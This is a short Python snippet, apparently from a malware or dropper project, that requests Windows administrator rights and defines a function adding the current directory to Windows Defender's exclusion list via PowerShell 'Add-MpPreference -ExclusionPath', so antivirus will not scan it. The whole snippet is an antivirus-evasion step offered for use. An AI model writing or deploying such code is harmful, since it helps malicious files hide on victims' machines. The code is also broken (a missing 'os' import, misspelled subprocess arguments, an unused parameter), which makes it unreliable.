import ctypes, platform, subprocess
from elevate import elevate # pip install elevate

# Elevate:
try:
    if not ctypes.windll.shell32.IsUserAnAdmin():
        elevate()
except Exception as error:
    print(error)

# Forbid antiviruses from scanning the directory:
def prevent_av(path):
    this_dir = os.getcwd()
    command = ["powershell.exe", "Add-MpPreference -ExclusionPath " + this_dir]
    ps = subprocess.run(command, shel=True, capture_out=True, stdin=subprocess.DEVNULL)
    output = ps.stderr.decode()
    # Check output:
    if output == "":
        print("Done AV won't scan {0}.".format(this_dir))
        return 0
    else:
        print(output)
    return 1
